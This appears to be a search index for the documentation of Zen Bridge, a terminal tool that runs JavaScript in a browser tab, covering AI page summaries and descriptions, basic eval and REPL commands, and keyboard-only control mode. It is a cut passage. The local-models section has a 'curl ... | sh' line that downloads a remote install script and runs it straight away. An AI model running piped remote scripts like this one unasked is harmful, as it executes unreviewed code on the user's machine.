labels, keyboard navigation, and screen reader compatibility.\nThe author emphasizes that accessibility benefits all users, not just those with\ndisabilities, by improving usability and SEO.\n</code></pre></p>"},{"location":"guide/ai-features/#how-it-works","title":"How It Works","text":"<ol> <li>Extract Article - Uses Mozilla Readability to extract main content</li> <li>Detect Language - Automatically detects page language</li> <li>Generate Summary - Sends content to AI via mods</li> <li>Return Result - Displays concise summary</li> </ol>"},{"location":"guide/ai-features/#show-full-article","title":"Show Full Article","text":"<pre><code>zen summarize --format full\n</code></pre> <p>Displays the extracted article content without summarizing:</p> <pre><code>Title: Web Accessibility Best Practices\nAuthor: John Doe\nPublished: 2024-01-15\n\nWeb accessibility is crucial for creating inclusive digital experiences...\n[Full extracted article text]\n</code></pre>"},{"location":"guide/ai-features/#language-control","title":"Language Control","text":"<p>Override the output language:</p> <pre><code># Summarize in French\nzen summarize --language fr\nzen summarize --lang fr\n\n# Summarize in Spanish\nzen summarize --language es\n\n# Summarize in German\nzen summarize --lang de\n</code></pre>"},{"location":"guide/ai-features/#language-detection-flow","title":"Language Detection Flow","text":"<ol> <li>CLI flag (<code>--language</code>) - Highest priority</li> <li>Config file (<code>ai-language</code> setting) - Second priority</li> <li>Page language (HTML <code>lang</code> attribute) - Third priority</li> <li>Let AI decide - Default behavior</li> </ol>"},{"location":"guide/ai-features/#debug-mode","title":"Debug Mode","text":"<p>See the full prompt sent to AI:</p> <pre><code>zen summarize --debug\n</code></pre> <p>Output: <pre><code>=== PROMPT ===\nPlease summarize the following article in 2-3 sentences.\nRespond in English.\n\nTitle: Web Accessibility Best Practices\nContent: [article content]\n=== END PROMPT ===\n</code></pre></p> <p>Useful for: - Understanding what's sent to AI - Debugging language issues - Customizing prompts</p>"},{"location":"guide/ai-features/#custom-prompts","title":"Custom Prompts","text":"<p>Edit the summarization prompt:</p> <pre><code># Edit prompt file\nnano ~/zen_bridge/prompts/summary.prompt\n</code></pre> <p>Default prompt: <pre><code>Please summarize the following article in 2-3 concise sentences.\nFocus on the main points and key takeaways.\n\n{LANGUAGE_INSTRUCTION}\n\nTitle: {TITLE}\nContent: {CONTENT}\n</code></pre></p> <p>Variables: - <code>{LANGUAGE_INSTRUCTION}</code> - Injected when <code>--language</code> is used - <code>{TITLE}</code> - Article title - <code>{CONTENT}</code> - Extracted article text</p>"},{"location":"guide/ai-features/#page-descriptions-for-screen-readers","title":"Page Descriptions for Screen Readers","text":"<p>The <code>zen describe</code> command generates natural-language page descriptions perfect for blind users.</p>"},{"location":"guide/ai-features/#basic-usage_1","title":"Basic Usage","text":"<pre><code>zen describe\n</code></pre> <p>Example output: <pre><code>This webpage is in Dutch, but is also available in English and French.\nAt the top you can navigate to services, articles, careers, about us\nand contact us. The main part contains a rather long article about an\nempathy lab with five headings. The footer contains standard links\nsuch as a sitemap and privacy statement.\n</code></pre></p>"},{"location":"guide/ai-features/#what-it-analyzes","title":"What It Analyzes","text":"<p>The <code>describe</code> command extracts:</p> <ul> <li>Available languages - Alternate language versions</li> <li>Navigation menus - Main navigation structure</li> <li>Page landmarks - Headers, main content, footer, etc.</li> <li>Heading structure - H1-H6 hierarchy and count</li> <li>Main content type - Article, form, list, etc.</li> <li>Content length - Approximate reading time</li> <li>Significant images - Alt text and image count</li> <li>Forms - Input fields and their purposes</li> <li>Footer utilities - Links like privacy policy, sitemap</li> </ul>"},{"location":"guide/ai-features/#language-control_1","title":"Language Control","text":"<pre><code># Describe in French\nzen describe --language fr\n\n# Describe in Spanish\nzen describe --lang es\n</code></pre>"},{"location":"guide/ai-features/#debug-mode_1","title":"Debug Mode","text":"<pre><code>zen describe --debug\n</code></pre> <p>See the extracted page structure and full prompt.</p>"},{"location":"guide/ai-features/#custom-prompts_1","title":"Custom Prompts","text":"<p>Edit the description prompt:</p> <pre><code>nano ~/zen_bridge/prompts/describe.prompt\n</code></pre> <p>Default prompt: <pre><code>Create a concise description of this webpage for a blind user using a screen reader.\nFocus on:\n- Available languages\n- Navigation structure\n- Main content type and purpose\n- Interactive elements\n- Overall page organization\n\nKeep it natural and conversational.\n\n{LANGUAGE_INSTRUCTION}\n\nPage Structure:\n{PAGE_STRUCTURE}\n</code></pre></p>"},{"location":"guide/ai-features/#configuration","title":"Configuration","text":""},{"location":"guide/ai-features/#language-settings","title":"Language Settings","text":"<p>Set default AI output language in <code>config.json</code>:</p> <pre><code>{\n  \"ai-language\": \"en\"\n}\n</code></pre> <p>Supported languages: - <code>en</code> - English - <code>es</code> - Spanish - <code>fr</code> - French - <code>de</code> - German - <code>nl</code> - Dutch - <code>it</code> - Italian - <code>pt</code> - Portuguese - <code>ja</code> - Japanese - <code>zh</code> - Chinese - And more...</p>"},{"location":"guide/ai-features/#customize-mods-settings","title":"Customize mods Settings","text":"<p>Configure mods behavior:</p> <pre><code># Set default AI model\nmods --settings\n\n# Use specific model\nmods --model gpt-4\n\n# Use local model with Ollama\nmods --model ollama:llama2\n</code></pre>"},{"location":"guide/ai-features/#practical-use-cases","title":"Practical Use Cases","text":""},{"location":"guide/ai-features/#content-research","title":"Content Research","text":"<pre><code># Quickly understand article\nzen summarize\n\n# Compare summaries\nzen summarize &gt; summary1.txt\n# Navigate to another article\nzen summarize &gt; summary2.txt\n</code></pre>"},{"location":"guide/ai-features/#accessibility-testing","title":"Accessibility Testing","text":"<pre><code># Generate page description\nzen describe\n\n# Test with actual screen reader\nzen describe | say  # macOS text-to-speech\n</code></pre>"},{"location":"guide/ai-features/#multi-language-content","title":"Multi-language Content","text":"<pre><code># Summarize in original language\nzen summarize\n\n# Translate summary\nzen summarize --language es\nzen summarize --language fr\n</code></pre>"},{"location":"guide/ai-features/#content-curation","title":"Content Curation","text":"<pre><code>#!/bin/bash\n# Batch summarize articles\n\nURLS=(\n  \"https://example.com/article1\"\n  \"https://example.com/article2\"\n  \"https://example.com/article3\"\n)\n\nfor url in \"${URLS[@]}\"; do\n  echo \"=== $url ===\" &gt;&gt; summaries.txt\n  zen open \"$url\" --wait\n  zen summarize &gt;&gt; summaries.txt\n  echo \"\" &gt;&gt; summaries.txt\ndone\n</code></pre>"},{"location":"guide/ai-features/#documentation-assistant","title":"Documentation Assistant","text":"<pre><code># Summarize documentation page\nzen summarize\n\n# Get page overview\nzen describe\n\n# Extract key sections\nzen outline\n</code></pre>"},{"location":"guide/ai-features/#advanced-examples","title":"Advanced Examples","text":""},{"location":"guide/ai-features/#multilingual-research-workflow","title":"Multilingual Research Workflow","text":"<pre><code>#!/bin/bash\n# Research workflow with translations\n\n# Navigate to French article\nzen open \"https://example.fr/article\"\n\n# Get English summary\nzen summarize --language en &gt; summary-en.txt\n\n# Get French summary\nzen summarize --language fr &gt; summary-fr.txt\n\n# Compare\ndiff summary-en.txt summary-fr.txt\n</code></pre>"},{"location":"guide/ai-features/#accessibility-audit","title":"Accessibility Audit","text":"<pre><code>#!/bin/bash\n# Audit multiple pages\n\nPAGES=(\n  \"https://example.com/\"\n  \"https://example.com/about\"\n  \"https://example.com/contact\"\n)\n\nfor page in \"${PAGES[@]}\"; do\n  echo \"Auditing: $page\"\n  zen open \"$page\" --wait\n\n  # Get description\n  echo \"Description:\" &gt;&gt; audit.txt\n  zen describe &gt;&gt; audit.txt\n\n  # Get outline\n  echo \"Outline:\" &gt;&gt; audit.txt\n  zen outline &gt;&gt; audit.txt\n\n  # Get link analysis\n  echo \"Links:\" &gt;&gt; audit.txt\n  zen links --only-internal &gt;&gt; audit.txt\n\n  echo \"---\" &gt;&gt; audit.txt\ndone\n</code></pre>"},{"location":"guide/ai-features/#content-monitoring","title":"Content Monitoring","text":"<pre><code>#!/bin/bash\n# Monitor article changes\n\nURL=\"https://example.com/article\"\n\nwhile true; do\n  zen open \"$URL\" --wait\n  SUMMARY=$(zen summarize)\n\n  if [[ \"$SUMMARY\" != \"$LAST_SUMMARY\" ]]; then\n    echo \"Article updated: $URL\"\n    echo \"$SUMMARY\"\n    LAST_SUMMARY=\"$SUMMARY\"\n  fi\n\n  sleep 3600  # Check every hour\ndone\n</code></pre>"},{"location":"guide/ai-features/#troubleshooting","title":"Troubleshooting","text":""},{"location":"guide/ai-features/#mods-not-found","title":"mods Not Found","text":"<p>Error: <pre><code>Error: mods command not found\n</code></pre></p> <p>Solution: <pre><code># Install mods\nbrew install charmbracelet/tap/mods\n\n# Or check PATH\nwhich mods\n</code></pre></p>"},{"location":"guide/ai-features/#api-key-not-set","title":"API Key Not Set","text":"<p>Error: <pre><code>Error: OPENAI_API_KEY not set\n</code></pre></p> <p>Solution: <pre><code># Set API key\nexport OPENAI_API_KEY=\"your-key-here\"\n\n# Or configure mods\nmods --settings\n</code></pre></p>"},{"location":"guide/ai-features/#no-article-content-found","title":"No Article Content Found","text":"<p>Error: <pre><code>Error: Could not extract article content\n</code></pre></p> <p>Possible causes: - Page is not an article (try a blog post or news article) - Content is behind login - Page uses non-standard structure</p> <p>Solution: Use <code>zen eval</code> to extract manually: <pre><code>zen eval \"document.querySelector('article')?.textContent\"\n</code></pre></p>"},{"location":"guide/ai-features/#rate-limiting","title":"Rate Limiting","text":"<p>Error: <pre><code>Error: Rate limit exceeded\n</code></pre></p> <p>Solution: - Wait and retry - Use a different AI provider - Use local models with Ollama</p>"},{"location":"guide/ai-features/#cost-considerations","title":"Cost Considerations","text":""},{"location":"guide/ai-features/#token-usage","title":"Token Usage","text":"<p>AI features consume tokens:</p> <p>Typical usage: - <code>zen summarize</code> - 500-2000 tokens (depending on article length) - <code>zen describe</code> - 300-800 tokens (depending on page complexity)</p> <p>Cost estimates (OpenAI GPT-3.5-Turbo): - ~\\(0.001 per summary - ~\\)0.0005 per description</p> <p>Cost estimates (Claude Sonnet): - ~\\(0.003 per summary - ~\\)0.001 per description</p>"},{"location":"guide/ai-features/#optimization-tips","title":"Optimization Tips","text":"<ol> <li>Use cheaper models for simple tasks</li> <li>Batch operations instead of repeated calls</li> <li>Use local models (Ollama) for free inference</li> <li>Cache results for frequently accessed pages</li> </ol>"},{"location":"guide/ai-features/#using-local-models","title":"Using Local Models","text":"<p>Free alternative with Ollama:</p> <pre><code># Install Ollama\ncurl https://ollama.ai/install.sh | sh\n\n# Download model\nollama pull llama2\n\n# Configure mods to use Ollama\nmods --model ollama:llama2\n\n# Use normally\nzen summarize\nzen describe\n</code></pre>"},{"location":"guide/ai-features/#best-practices","title":"Best Practices","text":""},{"location":"guide/ai-features/#1-verify-ai-output","title":"1. Verify AI Output","text":"<p>Always review AI-generated content:</p> <pre><code># Compare with full article\nzen summarize\nzen summarize --format full\n</code></pre>"},{"location":"guide/ai-features/#2-use-appropriate-languages","title":"2. Use Appropriate Languages","text":"<p>Match output language to use case:</p> <pre><code># English summary for English-speaking users\nzen summarize --language en\n\n# Native language for accessibility\nzen describe --language fr  # For French site\n</code></pre>"},{"location":"guide/ai-features/#3-customize-prompts","title":"3. Customize Prompts","text":"<p>Tailor prompts to your needs:</p> <pre><code># Edit prompts\nnano ~/zen_bridge/prompts/summary.prompt\nnano ~/zen_bridge/prompts/describe.prompt\n</code></pre>"},{"location":"guide/ai-features/#4-monitor-costs","title":"4. Monitor Costs","text":"<p>Track API usage:</p> <pre><code># Check mods usage\nmods --usage\n\n# Use local models for development\nmods --model ollama:llama2\n</code></pre>"},{"location":"guide/ai-features/#next-steps","title":"Next Steps","text":"<ul> <li>Control Mode - Keyboard-only navigation</li> <li>Advanced Usage - Complex patterns and scripting</li> </ul>"},{"location":"guide/ai-features/#quick-reference","title":"Quick Reference","text":"Command Purpose Example <code>zen summarize</code> Summarize article <code>zen summarize</code> <code>zen summarize --format full</code> Show full article <code>zen summarize --format full</code> <code>zen summarize --language es</code> Summarize in Spanish <code>zen summarize --lang es</code> <code>zen summarize --debug</code> Show AI prompt <code>zen summarize --debug</code> <code>zen describe</code> Describe page for screen readers <code>zen describe</code> <code>zen describe --language fr</code> Describe in French <code>zen describe --lang fr</code> <code>zen describe --debug</code> Show extracted structure <code>zen describe --debug</code>"},{"location":"guide/ai-features/#further-reading","title":"Further Reading","text":"<ul> <li>mods documentation</li> <li>Mozilla Readability</li> <li>OpenAI API</li> <li>Anthropic Claude</li> <li>Ollama</li> </ul>"},{"location":"guide/basic-commands/","title":"Basic Commands","text":"<p>Learn the essential commands for everyday use with Zen Bridge. This guide covers the most common commands you'll use for executing code, getting page information, managing the server, and working interactively.</p>"},{"location":"guide/basic-commands/#server-management","title":"Server Management","text":"<p>Before you can use any commands, the bridge server must be running.</p>"},{"location":"guide/basic-commands/#starting-the-server","title":"Starting the Server","text":"Background Mode (Recommended)Foreground ModeCustom Port <pre><code>zen server start --daemon\n</code></pre> <p>Starts the server in the background. You can close your terminal and the server keeps running.</p> <pre><code>zen server start\n</code></pre> <p>Starts the server in foreground mode. Useful for debugging. Press <code>Ctrl+C</code> to stop.</p> <pre><code>zen server start --port 9000 --daemon\n</code></pre> <p>Start on a different port (default is 8765).</p> <p>Auto-start on Login</p> <p>On macOS/Linux, you can create a launch agent or systemd service to start the server automatically when you log in.</p>"},{"location":"guide/basic-commands/#checking-server-status","title":"Checking Server Status","text":"<pre><code>zen server status\n</code></pre> <p>Example output: <pre><code>Bridge server is running\n  Pending requests:   0\n  Completed requests: 42\n</code></pre></p> <p>Shows: - Whether the server is running - Number of pending requests - Total completed requests since server started</p>"},{"location":"guide/basic-commands/#stopping-the-server","title":"Stopping the Server","text":"<pre><code>zen server stop\n</code></pre> <p>Only works if the server is running in foreground mode. For daemon mode, use:</p> <pre><code>pkill -f \"zen server\"\n</code></pre> <p>Daemon Mode Limitation</p> <p>There's no built-in daemon stop command yet. Use <code>pkill</code> as shown above.</p>"},{"location":"guide/basic-commands/#executing-javascript-code","title":"Executing JavaScript Code","text":"<p>The <code>zen eval</code> command is your primary way to execute JavaScript in the browser.</p>"},{"location":"guide/basic-commands/#basic-syntax","title":"Basic Syntax","text":"<pre><code>zen eval \"javascript_code_here\"\n</code></pre>"},{"location":"guide/basic-commands/#simple-expressions","title":"Simple Expressions","text":"<p>Get quick information from the page:</p> <pre><code># Page title\nzen eval \"document.title\"\n# Output: Example Domain\n\n# Page URL\nzen eval \"location.href\"\n# Output: https://example.com/\n\n# Number of links\nzen eval \"document.links.length\"\n# Output: 15\n\n# Get domain\nzen eval \"location.hostname\"\n# Output: example.com\n</code></pre>"},{"location":"guide/basic-commands/#complex-expressions","title":"Complex Expressions","text":"<p>Use arrays, objects, and methods:</p> <pre><code># Extract all links\nzen eval \"Array.from(document.links).map(a =&gt; a.href)\"\n\n# Get multiple properties\nzen eval \"({url: location.href, title: document.title, links: document.links.length})\"\n\n# Filter elements\nzen eval \"Array.from(document.querySelectorAll('a')).filter(a =&gt; a.hostname !== location.hostname).map(a =&gt; a.href)\"\n</code></pre>"},{"location":"guide/basic-commands/#multi-line-code","title":"Multi-line Code","text":"<p>For complex logic, use proper JavaScript syntax:</p> <pre><code>zen eval \"\n  const links = Array.from(document.querySelectorAll('a'));\n  const internal = links.filter(a =&gt; a.hostname === location.hostname);\n  const external = links.filter(a =&gt; a.hostname !== location.hostname);\n  return {\n    total: links.length,\n    internal: internal.length,\n    external: external.length\n  };\n\"\n</code></pre> <p>Semicolons Matter</p> <p>When using multiple statements, separate them with semicolons. The last expression is automatically returned.</p>"},{"location":"guide/basic-commands/#using-stdin","title":"Using stdin","text":"<p>Pipe JavaScript code from files or other commands:</p> <pre><code># From a file\ncat script.js | zen eval\n\n# From echo\necho \"document.title\" | zen eval\n\n# From heredoc\nzen eval &lt;&lt;'EOF'\nconst images = document.querySelectorAll('img');\nreturn Array.from(images).map(img =&gt; ({\n  src: img.src,\n  alt: img.alt,\n  width: img.naturalWidth,\n  height: img.naturalHeight\n}));\nEOF\n</code></pre>"},{"location":"guide/basic-commands/#executing-files","title":"Executing Files","text":"<p>The <code>zen exec</code> command executes JavaScript from a file.</p>"},{"location":"guide/basic-commands/#basic-usage","title":"Basic Usage","text":"<pre><code>zen exec script.js\n</code></pre> <p>Same as: <pre><code>zen eval --file script.js\n</code></pre></p>"},{"location":"guide/basic-commands/#example-script","title":"Example Script","text":"<p>script.js: <pre><code>// Extract all product information\nconst products = Array.from(document.querySelectorAll('.product'));\nreturn products.map(product =&gt; ({\n  name: product.querySelector('.product-name').textContent,\n  price: product.querySelector('.product-price').textContent,\n  rating: product.querySelector('.product-rating')?.textContent,\n  image: product.querySelector('.product-image')?.src\n}));\n</code></pre></p> <p>Execute: <pre><code>zen exec script.js --format json &gt; products.json\n</code></pre></p>"},{"location":"guide/basic-commands/#built-in-scripts","title":"Built-in Scripts","text":"<p>Zen Bridge includes ready-to-use scripts:</p> <pre><code># Extract all images with metadata\nzen exec zen/scripts/extract_images.js --format json\n\n# Extract table data\nzen exec zen/scripts/extract_table.js --format json\n\n# Get SEO metadata\nzen exec zen/scripts/extract_metadata.js --format json\n\n# Performance metrics\nzen exec zen/scripts/performance_metrics.js --format json\n\n# Inject jQuery\nzen exec zen/scripts/inject_jquery.js\n</code></pre>"},{"location":"guide/basic-commands/#page-information","title":"Page Information","text":"<p>Get comprehensive information about the current page.</p>"},{"location":"guide/basic-commands/#basic-info","title":"Basic Info","text":"<pre><code>zen info\n</code></pre> <p>Output: <pre><code>URL:      https://example.com\nTitle:    Example Domain\nDomain:   example.com\nProtocol: https:\nState:    complete\nSize:     1280x720\n</code></pre></p> <p>Shows: - Current URL - Page title - Domain name - Protocol (http/https) - Document ready state - Window dimensions</p>"},{"location":"guide/basic-commands/#extended-information","title":"Extended Information","text":"<pre><code>zen info --extended\n</code></pre> <p>Includes additional details: - Language &amp; Encoding - Page language, character set - Meta Tags - Description, keywords, viewport - Resources - Script count, stylesheet count, cookie count - Security - HTTPS, mixed content warnings, CSP headers - Accessibility - Landmark count, heading structure, alt text issues - SEO - Canonical URL, Open Graph tags, structured data - Storage - localStorage and sessionStorage sizes - Service Workers - Registration status</p>"},{"location":"guide/basic-commands/#json-output","title":"JSON Output","text":"<pre><code>zen info --json\n</code></pre> <p>Outputs all information as JSON for parsing with <code>jq</code> or other tools:</p> <pre><code>zen info --json | jq '.url'\nzen info --json | jq '.title'\n</code></pre>"},{"location":"guide/basic-commands/#interactive-repl","title":"Interactive REPL","text":"<p>Start a live JavaScript session to experiment interactively.</p>"},{"location":"guide/basic-commands/#starting-the-repl","title":"Starting the REPL","text":"<pre><code>zen repl\n</code></pre> <p>Output: <pre><code>Connected to: Example Domain\nhttps://example.com\n\nType 'exit' or press Ctrl+D to quit.\n\nzen&gt;\n</code></pre></p>"},{"location":"guide/basic-commands/#using-the-repl","title":"Using the REPL","text":"<p>Type JavaScript code and press Enter:</p> <pre><code>zen&gt; document.title\n\"Example Domain\"\n\nzen&gt; document.querySelectorAll('p').length\n2\n\nzen&gt; const links = Array.from(document.links)\nundefined\n\nzen&gt; links.length\n10\n\nzen&gt; links.map(a =&gt; a.href)\n[\n  \"https://example.com/page1\",\n  \"https://example.com/page2\",\n  ...\n]\n\nzen&gt; exit\nGoodbye!\n</code></pre>"},{"location":"guide/basic-commands/#repl-features","title":"REPL Features","text":"<ul> <li>State preservation - Variables persist across commands</li> <li>Multi-line editing - Use arrow keys to edit history</li> <li>Auto-display - Last expression is automatically printed</li> <li>Error messages - Syntax and runtime errors are shown clearly</li> </ul> <p>REPL Shortcuts</p> <ul> <li><code>Ctrl+D</code> or <code>exit</code> - Quit REPL</li> <li><code>Ctrl+C</code> - Cancel current line</li> <li><code>Up/Down arrows</code> - Navigate history</li> </ul>"},{"location":"guide/basic-commands/#repl-use-cases","title":"REPL Use Cases","text":"<p>Testing selectors: <pre><code>zen&gt; document.querySelector('.main-content')\n[object HTMLDivElement]\n\nzen&gt; $0.textContent  // if using DevTools\n\"Main content here...\"\n</code></pre></p> <p>Experimenting with APIs: <pre><code>zen&gt; await fetch('/api/data').then(r =&gt; r.json())\n{userId: 1, name: \"John Doe\"}\n</code></pre></p> <p>Debugging: <pre><code>zen&gt; window.myApp\n{state: {...}, config: {...}}\n\nzen&gt; window.myApp.state\n{user: {...}, settings: {...}}\n</code></pre></p>"},{"location":"guide/basic-commands/#output-formatting","title":"Output Formatting","text":"<p>Control how results are displayed using the <code>--format</code> flag.</p>"},{"location":"guide/basic-commands/#format-options","title":"Format Options","text":"Format Description Best For <code>auto</code> (default) Smart formatting based on output type General use <code>json</code> Valid JSON output Piping to <code>jq</code>, scripts <code>raw</code> Plain text, no formatting Shell variables, parsing"},{"location":"guide/basic-commands/#auto-format-default","title":"Auto Format (Default)","text":"<pre><code>zen eval \"document.title\"\n</code></pre> <p>Intelligently formats based on the result type: - Strings: plain text - Objects/Arrays: pretty-printed JSON - Numbers: plain text - undefined/null: \"(empty)\"</p>"},{"location":"guide/basic-commands/#json-format","title":"JSON Format","text":"<pre><code>zen eval \"({title: document.title, url: location.href})\" --format json\n</code></pre> <p>Output: <pre><code>{\n  \"title\": \"Example Domain\",\n  \"url\": \"https://example.com\"\n}\n</code></pre></p> <p>Perfect for piping to <code>jq</code>: <pre><code>zen eval \"({title: document.title, url: location.href})\" --format json | jq '.title'\n</code></pre></p>"},{"location":"guide/basic-commands/#raw-format","title":"Raw Format","text":"<pre><code>zen eval \"document.title\" --format raw\n</code></pre> <p>Output: <pre><code>Example Domain\n</code></pre></p> <p>No extra formatting - perfect for shell variables: <pre><code>TITLE=$(zen eval \"document.title\" --format raw)\necho \"Page title is: $TITLE\"\n</code></pre></p>"},{"location":"guide/basic-commands/#adding-metadata","title":"Adding Metadata","text":"<p>Add URL and title to output:</p> <pre><code># Add URL\nzen eval \"document.links.length\" --url\n\n# Add title\nzen eval \"document.links.length\" --title\n\n# Add both\nzen eval \"document.links.length\" --url --title\n</code></pre> <p>Output: <pre><code>URL: https://example.com\nTitle: Example Domain\n\n15\n</code></pre></p>"},{"location":"guide/basic-commands/#timeout-control","title":"Timeout Control","text":"<p>Commands have a default 10-second timeout. Adjust for slow operations.</p> <pre><code># Default timeout (10 seconds)\nzen eval \"document.title\"\n\n# Custom timeout (30 seconds)\nzen eval \"await slowOperation()\" --timeout 30\n\n# Short timeout (5 seconds)\nzen eval \"document.title\" --timeout 5\n</code></pre> <p>Timeouts</p> <p>If a command takes longer than the timeout, you'll see: <pre><code>Error: Request timed out after 10 seconds\n</code></pre></p> <p>Increase the timeout with <code>--timeout</code>.</p>"},{"location":"guide/basic-commands/#userscript-information","title":"Userscript Information","text":"<p>View installation instructions for the browser userscript.</p> <pre><code>zen userscript\n</code></pre> <p>Displays: - Installation instructions - Userscript manager links (Violentmonkey, Tampermonkey) - How to view the userscript code</p>"},{"location":"guide/basic-commands/#common-patterns","title":"Common Patterns","text":""},{"location":"guide/basic-commands/#get-page-data","title":"Get Page Data","text":"<pre><code># Title\nzen eval \"document.title\"\n\n# URL\nzen eval \"location.href\"\n\n# Domain\nzen eval \"location.hostname\"\n\n# Full page info\nzen info\n</code></pre>"},{"location":"guide/basic-commands/#count-elements","title":"Count Elements","text":"<pre><code># All links\nzen eval \"document.links.length\"\n\n# All images\nzen eval \"document.images.length\"\n\n# Specific selector\nzen eval \"document.querySelectorAll('.product').length\"\n</code></pre>"},{"location":"guide/basic-commands/#extract-text","title":"Extract Text","text":"<pre><code># Page text\nzen eval \"document.body.textContent\"\n\n# Heading text\nzen eval \"document.querySelector('h1').textContent\"\n\n# All headings\nzen eval \"Array.from(document.querySelectorAll('h1,h2,h3')).map(h =&gt; h.textContent)\"\n</code></pre>"},{"location":"guide/basic-commands/#check-existence","title":"Check Existence","text":"<pre><code># Element exists\nzen eval \"document.querySelector('.modal') !== null\"\n\n# Element visible\nzen eval \"document.querySelector('.modal')?.offsetParent !== null\"\n</code></pre>"},{"location":"guide/basic-commands/#error-handling","title":"Error Handling","text":""},{"location":"guide/basic-commands/#common-errors","title":"Common Errors","text":"<p>Server not running: <pre><code>Error: Bridge server is not running\nPlease start the server with: zen server start\n</code></pre></p> <p>Solution: Start the server with <code>zen server start --daemon</code></p> <p>No browser connection: <pre><code>Error: No response from browser\n</code></pre></p> <p>Solutions: - Ensure the userscript is installed and enabled - Open a browser tab (userscript only works in active tabs) - Check browser console for errors - Refresh the page</p> <p>Timeout: <pre><code>Error: Request timed out after 10 seconds\n</code></pre></p> <p>Solution: Increase timeout with <code>--timeout 30</code></p> <p>JavaScript error: <pre><code>TypeError: Cannot read property 'click' of null\n</code></pre></p> <p>Solution: Check your selectors - element may not exist</p>"},{"location":"guide/basic-commands/#tips-and-tricks","title":"Tips and Tricks","text":""},{"location":"guide/basic-commands/#use-shell-variables","title":"Use Shell Variables","text":"<pre><code>TITLE=$(zen eval \"document.title\" --format raw)\nURL=$(zen eval \"location.href\" --format raw)\n\necho \"Title: $TITLE\"\necho \"URL: $URL\"\n</code></pre>"},{"location":"guide/basic-commands/#pipe-to-other-tools","title":"Pipe to Other Tools","text":"<pre><code># Count links\nzen eval \"Array.from(document.links).map(a =&gt; a.href).join('\\n')\" --format raw | wc -l\n\n# Filter with grep\nzen eval \"Array.from(document.links).map(a =&gt; a.href).join('\\n')\" --format raw | grep \"github\"\n\n# Process with jq\nzen eval \"Array.from(document.links).map(a =&gt; ({text: a.textContent, href: a.href}))\" --format json | jq '.[0]'\n</code></pre>"},{"location":"guide/basic-commands/#asyncawait-support","title":"Async/Await Support","text":"<pre><code>zen eval \"await fetch('/api/data').then(r =&gt; r.json())\"\n</code></pre>"},{"location":"guide/basic-commands/#console-logging","title":"Console Logging","text":"<pre><code>zen eval \"console.log('Debug info'); document.title\"\n</code></pre> <p>Check your browser console to see the log output.</p>"},{"location":"guide/basic-commands/#next-steps","title":"Next Steps","text":"<ul> <li>JavaScript Execution - Deep dive into code execution</li> <li>Element Interaction - Click, inspect, and interact with elements</li> <li>Data Extraction - Extract structured data from pages</li> </ul>"},{"location":"guide/basic-commands/#quick-reference","title":"Quick Reference","text":"Command Purpose Example <code>zen server start --daemon</code> Start server in background - <code>zen server status</code> Check server status - <code>zen eval \"code\"</code> Execute JavaScript <code>zen eval \"document.title\"</code> <code>zen exec file.js</code> Execute file <code>zen exec script.js</code> <code>zen info</code> Get page info <code>zen info --extended</code> <code>zen repl</code> Interactive mode - <code>zen userscript</code> View userscript info - <p>You're Ready!</p> <p>You now know the essential commands to control your browser from the terminal. Explore the other guides to learn advanced features!</p>"},{"location":"guide/control-mode/","title":"Control Mode","text":"<p>Master keyboard-only navigation with Zen Bridge Control Mode. Navigate pages entirely from your terminal using Tab, Enter, and Arrow keys.</p>"},{"location":"guide/control-mode/#overview","title":"Overview","text":"<p><code>zen control</code> provides keyboard-only navigation for accessibility testing and hands-free browsing. It's perfect for:</p> <ul> <li>Accessibility testing - Verify keyboard navigation</li> <li>Hands-free browsing - Navigate without a mouse</li> <li>Screen reader compatibility - Test with keyboard + voice</li> <li>Focus management testing - Verify focus indicators</li> <li>Navigation persistence - Auto-refocus after page loads</li> </ul>"},{"location":"guide/control-mode/#starting-control-mode","title":"Starting Control Mode","text":"<pre><code>zen control\n</code></pre> <p>What happens:</p> <ol> <li>Terminal enters raw mode (captures all keyboard input)</li> <li>Browser receives keyboard events in real-time</li> <li>Focus indicators appear on interactive elements</li> <li>Terminal displays announcements and feedback</li> <li>Mode persists across page navigations</li> </ol> <p>To exit: Press <code>Ctrl+D</code> or <code>q</code></p>"},{"location":"guide/control-mode/#keyboard-navigation","title":"Keyboard Navigation","text":""},{"location":"guide/control-mode/#basic-controls","title":"Basic Controls","text":"Key Action <code>Tab</code> Navigate forward through focusable elements <code>Shift+Tab</code> Navigate backward <code>Enter</code> Activate focused element (click/submit) <code>Space</code> Activate focused element <code>Arrow Keys</code> Navigate directionally <code>Escape</code> Return focus to body <code>q</code> Quit control mode <code>Ctrl+D</code> Quit control mode"},{"location":"guide/control-mode/#how-it-works","title":"How It Works","text":"<p>Control mode captures your keystrokes and sends them to the browser:</p> <ol> <li>You press Tab in terminal</li> <li>Zen sends Tab to browser</li> <li>Browser shifts focus to next element</li> <li>Element is highlighted with blue outline</li> <li>Terminal announces element name and role</li> </ol>"},{"location":"guide/control-mode/#visual-feedback","title":"Visual Feedback","text":"<p>Focused elements get a blue outline (<code>outline: 2px solid blue</code>) so you can see what's focused.</p>"},{"location":"guide/control-mode/#terminal-announcements","title":"Terminal Announcements","text":"<p>Control mode announces element details in your terminal:</p> <pre><code>Focus: Submit Button (button)\nFocus: Email Input (input)\nFocus: Privacy Policy (link)\n</code></pre>"},{"location":"guide/control-mode/#features","title":"Features","text":""},{"location":"guide/control-mode/#auto-refocus-after-navigation","title":"Auto-refocus After Navigation","text":"<p>Control mode persists across page navigations:</p> <pre><code>zen control\n# Tab to a link\n# Press Enter \u2192 Page loads\n# \u2192 Focus automatically returns to the link\n# Continue tabbing from there\n</code></pre> <p>This is unique to Zen Bridge - the focus persists even after navigation!</p>"},{"location":"guide/control-mode/#text-to-speech-macos","title":"Text-to-Speech (macOS)","text":"<p>Enable voice announcements:</p> <pre><code># Set in config.json\n{\n  \"control\": {\n    \"speak-all\": true\n  }\n}\n</code></pre> <p>Focused elements are announced via macOS <code>say</code> command:</p> <pre><code>\"Submit Button\"\n\"Email Input\"\n\"Privacy Policy Link\"\n</code></pre> <p>Perfect for testing screen reader workflows without actual screen reader.</p>"},{"location":"guide/control-mode/#accessibility-names","title":"Accessibility Names","text":"<p>Control mode extracts accessible names for elements:</p> <ul> <li><code>aria-label</code> attribute</li> <li><code>aria-labelledby</code> reference</li> <li>Associated <code>&lt;label&gt;</code> text</li> <li>Button/link text content</li> <li><code>alt</code> text for images</li> <li><code>title</code> attribute</li> </ul> <p>This matches what screen readers announce!</p>"},{"location":"guide/control-mode/#configuration","title":"Configuration","text":"<p>Edit <code>config.json</code> in project root:</p> <pre><code>{\n  \"control\": {\n    \"verbose\": true,\n    \"speak-all\": true,\n    